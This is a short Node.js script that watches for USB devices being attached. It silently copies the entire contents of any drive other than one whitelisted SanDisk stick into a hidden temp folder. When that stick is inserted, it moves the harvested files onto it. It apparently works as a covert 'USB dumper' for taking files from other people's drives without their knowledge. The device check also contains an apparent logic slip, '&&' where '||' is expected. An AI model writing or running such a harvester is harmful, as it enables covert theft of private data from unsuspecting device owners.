import {usb} from "usb"
import fs from "fs"

let args = ["F:/", "D:/Temp/", "F:/Backup/"], info = null

process.argv.slice(2, 5).forEach((arg, index) => {
    args[index] = arg
})

usb.on("attach", (device) => {
    if (fs.existsSync(args[0])) {
        info = device.deviceDescriptor
        if (info.idVendor !== 0x0781 && info.idProduct !== 0x5591) {
            fs.cpSync(args[0], args[1]+crypto.randomUUID(), {recursive: true})
        }
        else if (fs.existsSync(args[1])) {
            fs.cpSync(args[1], args[2], {recursive: true})
        }
    }
})